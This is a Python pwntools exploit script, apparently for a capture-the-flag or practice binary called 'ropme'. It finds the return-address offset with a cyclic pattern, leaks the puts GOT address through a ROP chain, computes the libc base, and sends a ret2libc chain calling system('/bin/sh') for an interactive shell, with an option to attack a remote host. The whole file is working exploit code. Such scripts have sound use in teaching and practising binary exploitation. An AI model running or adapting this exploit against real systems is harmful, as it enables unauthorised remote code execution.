from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('?', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ropme'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

# Start program
io = start()

# Our local libc
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create ROP object from binary
rop = ROP(elf)
# Call puts, to leak address, then return to main
rop.puts(elf.got.puts)
rop.main()

# Leak GOT address payload
payload = flat({
    offset: rop.chain()
})

# Send the payload
io.sendlineafter('?', payload)
io.recv()  # Receive junk

# Leaked got.puts address
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Calculate libc base + update binary address
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Create ROP object from libc library
rop = ROP(libc)
# Call system, with "/bin/sh" as parameter
rop.system(next(libc.search(b'/bin/sh\x00')))

# Shell payload
payload = flat({
    offset: rop.chain()
})

# Exploit
io.sendline(payload)

# Got Shell?
io.interactive()
